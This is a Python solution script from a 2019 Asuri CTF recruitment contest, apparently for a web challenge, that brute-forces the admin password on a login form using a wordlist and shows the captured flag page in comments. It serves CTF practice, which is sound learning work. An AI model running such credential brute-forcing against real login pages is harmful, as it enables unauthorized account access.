# -*- coding:utf-8 -*-
# Asuri 招新赛 20191117晚
# medium_web_justburp
import requests

s = requests.Session()
r = s.get("http://139.9.212.218:39010/index.php")
r.encoding = "utf-8"
print(r.text)

with open('name-pass.txt', 'r') as file:
    contents = file.read().split()
    # print(contents)
    passwords = contents

for password in passwords:
    values = {'name': 'admin',
              'password': password}
    r = s.get("http://139.9.212.218:39010/index.php", params=values)
    r.encoding = 'utf-8'
    if '密码错误' not in r.text:
        print(r.text)

# <!DOCTYPE html>
# <html><head><meta charset="utf-8" />
# <title>Hi hacker</title>
# </head>
# <body bgcolor="bisque">
# <form action="index.php" method="get">用户名：<br><input type="text" name="name"><br>密码：<br><input type="text" name="password"><br><br><input type="submit" value="登陆">
# </form>
# <p>hint:admin用户的密码似乎在某个页面里 </p>
# <p>
# 看你骨骼精奇，就将flag交于你了！Asuri{Burp_1s_Gre@t}</p>
# </body>
# </html>
